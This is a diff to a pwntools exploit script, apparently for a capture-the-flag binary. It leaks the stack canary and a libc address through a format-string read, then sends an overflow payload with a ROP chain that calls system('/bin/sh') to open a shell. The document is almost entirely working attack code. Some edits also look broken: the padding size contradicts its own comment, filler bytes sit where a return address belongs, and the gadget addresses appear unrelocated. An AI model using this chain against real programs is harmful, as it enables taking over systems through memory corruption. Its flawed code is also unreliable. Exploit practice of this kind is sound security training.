@@ -42,7 +42,7 @@ setvbuffOffset = "0x2f8d0"
 setvbuffOffsetInt = int(setvbuffOffset,16)
 
 # variables
-padding = b'a'*48 # truly 80, but the last 8 bytes are the canary, look at gets not fgets, 50h
+padding = b'a'*72 # truly 80, but the last 8 bytes are the canary, look at gets not fgets, 50h
 padOverBP = b'a'*8  # overwrite base pointer
 leakAddrStr = b"%19$p %23$p"
 
@@ -58,6 +58,7 @@ leak = p.recvuntil(b" ")    # should be leak addr
 leakInt = int(leak,16)+getToVbuff       # should be address of vbuff
 canary = p.recvuntil(b"\n") # should be canary val
 canaryInt = int(canary,16)
+canaryInt = p64(canaryInt)
 
 print("leak:", leak)
 print("canary:", canary)
@@ -69,9 +70,9 @@ print("libc Start:",hex(libcStart))
 # Exploit time
 popRdiRet = p64(0x0000000000001343)
 binsh = p64(next(libc.search(b'/bin/sh\x00')))
-ret = p64(0x000000000000101a)
+retgad = p64(0x000000000000101a)
 libsys = p64(libc.sym.system)
-payload = padding + canary + padOverBP + popRdiRet + binsh + ret + libsys
+payload = padding + canaryInt + padOverBP + popRdiRet + binsh + b'aaaaaaaa' + retgad + libsys
 
 # send and find flag
 p.sendline(payload)
